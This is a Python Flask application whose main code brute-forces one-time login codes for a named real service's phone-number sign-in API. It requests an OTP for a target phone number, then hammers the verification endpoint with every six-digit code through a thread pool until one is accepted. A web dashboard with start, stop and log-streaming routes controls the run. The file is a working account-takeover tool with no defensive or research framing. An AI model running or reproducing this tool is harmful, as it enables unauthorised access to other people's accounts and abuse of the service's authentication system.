# main.py
import requests
import time
import threading
import json
from flask import Flask, render_template, request, jsonify, Response, stream_with_context
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import queue

app = Flask(__name__)

# Global state for tracking brute force progress
brute_force_state = {
    'is_running': False,
    'total_attempts': 0,
    'total_possible': 900000,
    'current_otp': 0,
    'found_otp': None,
    'start_time': None,
    'status_counts': {},
    'logs': [],
    'stop_flag': False,
    'phone_number': None,
    'speed': 0,
    'last_100_attempts': []
}

log_queue = queue.Queue()

class ClashX24Login:
    def __init__(self):
        self.session = requests.Session()
        self.headers = {
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "User-Agent": "okhttp/4.12.0"
        }
        self.session.headers.update(self.headers)
        self.phone_number = None
        self.stop_bruteforce = False
        
    def send_otp(self, phone_number):
        """Send OTP to the provided phone number"""
        send_otp_url = "https://api.clashx24.xyz/user/login-code"
        otp_payload = {"phone_number": phone_number}
        
        try:
            otp_response = self.session.post(send_otp_url, json=otp_payload)
            
            if otp_response.status_code in [200, 201]:
                return True, otp_response.text
            else:
                return False, otp_response.text
        except Exception as e:
            return False, str(e)
    
    def verify_otp(self, otp, show_response=True):
        """Verify OTP and return response"""
        verify_otp_url = "https://api.clashx24.xyz/user/sign-in"
        verify_payload = {
            "phone_number": self.phone_number,
            "verification_code": str(otp),
            "OTP": int(otp) if str(otp).isdigit() else otp
        }
        
        try:
            verify_response = self.session.post(verify_otp_url, json=verify_payload)
            return verify_response
        except Exception as e:
            return None

def add_log(message, status="info"):
    """Add log entry with timestamp"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    log_entry = {
        'timestamp': timestamp,
        'message': message,
        'status': status
    }
    brute_force_state['logs'].append(log_entry)
    # Keep only last 1000 logs
    if len(brute_force_state['logs']) > 1000:
        brute_force_state['logs'] = brute_force_state['logs'][-1000:]
    log_queue.put(log_entry)

def brute_force_worker(otp, login_instance):
    """Worker function for brute forcing OTP"""
    if brute_force_state['stop_flag']:
        return None
        
    response = login_instance.verify_otp(otp, show_response=False)
    
    # Update status counts
    status_code = response.status_code if response else 'error'
    brute_force_state['status_counts'][status_code] = brute_force_state['status_counts'].get(status_code, 0) + 1
    
    # Log every 100 attempts or on status change
    if brute_force_state['total_attempts'] % 100 == 0:
        add_log(f"Attempt #{brute_force_state['total_attempts']}: OTP {otp} - Status {status_code}")
    
    if response and response.status_code != 400:
        brute_force_state['found_otp'] = otp
        brute_force_state['stop_flag'] = True
        add_log(f"✅ SUCCESS! Valid OTP found: {otp}", "success")
        add_log(f"Response: {response.text}", "success")
        return otp
    
    return None

def run_brute_force(phone_number, max_workers=10):
    """Main brute force function"""
    global brute_force_state
    
    # Reset state
    brute_force_state['is_running'] = True
    brute_force_state['total_attempts'] = 0
    brute_force_state['found_otp'] = None
    brute_force_state['start_time'] = time.time()
    brute_force_state['status_counts'] = {}
    brute_force_state['stop_flag'] = False
    brute_force_state['phone_number'] = phone_number
    brute_force_state['logs'] = []
    brute_force_state['speed'] = 0
    
    add_log(f"🚀 Starting brute force for {phone_number}", "info")
    add_log(f"📊 Total possible OTPs: 900,000", "info")
    add_log(f"⚡ Using {max_workers} workers", "info")
    
    login_instance = ClashX24Login()
    login_instance.phone_number = phone_number
    
    start_time = time.time()
    total_attempts = 0
    
    # Generate OTPs: 100000 to 999999
    otp_range = range(100000, 1000000)
    total_possible = 900000
    
    try:
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            # Submit tasks in batches to manage memory
            batch_size = 1000
            futures = []
            
            for otp in otp_range:
                if brute_force_state['stop_flag']:
                    break
                    
                future = executor.submit(brute_force_worker, otp, login_instance)
                futures.append(future)
                
                # Process completed futures in batches
                if len(futures) >= batch_size:
                    for f in futures:
                        if brute_force_state['stop_flag']:
                            break
                        try:
                            result = f.result(timeout=0.1)
                            total_attempts += 1
                            brute_force_state['total_attempts'] = total_attempts
                            
                            # Update speed
                            elapsed = time.time() - start_time
                            if elapsed > 0:
                                brute_force_state['speed'] = total_attempts / elapsed
                            
                            if result:
                                executor.shutdown(wait=False, cancel_futures=True)
                                break
                        except:
                            pass
                    
                    futures = []
                    
                    # Log progress every 500 attempts
                    if total_attempts % 500 == 0:
                        elapsed = time.time() - start_time
                        speed = total_attempts / elapsed if elapsed > 0 else 0
                        add_log(f"📈 Progress: {total_attempts}/{total_possible} ({total_attempts/total_possible*100:.2f}%) - Speed: {speed:.1f} OTP/s")
    
    except Exception as e:
        add_log(f"❌ Error: {str(e)}", "error")
    
    elapsed_time = time.time() - start_time
    brute_force_state['is_running'] = False
    
    add_log(f"📊 Brute force completed!", "info")
    add_log(f"⏱️ Time taken: {elapsed_time:.2f} seconds", "info")
    add_log(f"📈 Total attempts: {total_attempts}", "info")
    
    if brute_force_state['found_otp']:
        add_log(f"✅ Valid OTP found: {brute_force_state['found_otp']}", "success")
    else:
        add_log("❌ No valid OTP found", "error")
    
    return brute_force_state['found_otp']

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/send-otp', methods=['POST'])
def send_otp():
    phone_number = request.json.get('phone_number')
    
    if not phone_number or len(phone_number) != 10 or not phone_number.isdigit():
        return jsonify({'success': False, 'message': 'Invalid phone number'}), 400
    
    login = ClashX24Login()
    success, response = login.send_otp(phone_number)
    
    return jsonify({
        'success': success,
        'message': 'OTP sent successfully' if success else 'Failed to send OTP',
        'response': response
    })

@app.route('/start-bruteforce', methods=['POST'])
def start_bruteforce():
    if brute_force_state['is_running']:
        return jsonify({'success': False, 'message': 'Brute force already running'}), 400
    
    phone_number = request.json.get('phone_number')
    max_workers = request.json.get('max_workers', 10)
    
    if not phone_number or len(phone_number) != 10 or not phone_number.isdigit():
        return jsonify({'success': False, 'message': 'Invalid phone number'}), 400
    
    # Start brute force in background thread
    thread = threading.Thread(target=run_brute_force, args=(phone_number, max_workers))
    thread.daemon = True
    thread.start()
    
    return jsonify({'success': True, 'message': 'Brute force started'})

@app.route('/stop-bruteforce', methods=['POST'])
def stop_bruteforce():
    brute_force_state['stop_flag'] = True
    return jsonify({'success': True, 'message': 'Stop signal sent'})

@app.route('/status')
def status():
    elapsed = 0
    if brute_force_state['start_time']:
        elapsed = time.time() - brute_force_state['start_time']
    
    return jsonify({
        'is_running': brute_force_state['is_running'],
        'total_attempts': brute_force_state['total_attempts'],
        'total_possible': brute_force_state['total_possible'],
        'found_otp': brute_force_state['found_otp'],
        'elapsed_time': elapsed,
        'speed': brute_force_state['speed'],
        'status_counts': brute_force_state['status_counts'],
        'phone_number': brute_force_state['phone_number'],
        'progress_percentage': (brute_force_state['total_attempts'] / brute_force_state['total_possible'] * 100) if brute_force_state['total_possible'] > 0 else 0
    })

@app.route('/logs')
def get_logs():
    return jsonify(brute_force_state['logs'])

@app.route('/stream-logs')
def stream_logs():
    def generate():
        last_index = 0
        while True:
            try:
                # Get new logs from queue
                log = log_queue.get(timeout=5)
                yield f"data: {json.dumps(log)}\n\n"
            except queue.Empty:
                # Send heartbeat to keep connection alive
                yield f"data: {json.dumps({'type': 'heartbeat'})}\n\n"
                continue
            except GeneratorExit:
                break
    
    return Response(stream_with_context(generate()), mimetype='text/event-stream')

@app.route('/health')
def health():
    return jsonify({'status': 'healthy', 'timestamp': datetime.now().isoformat()})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
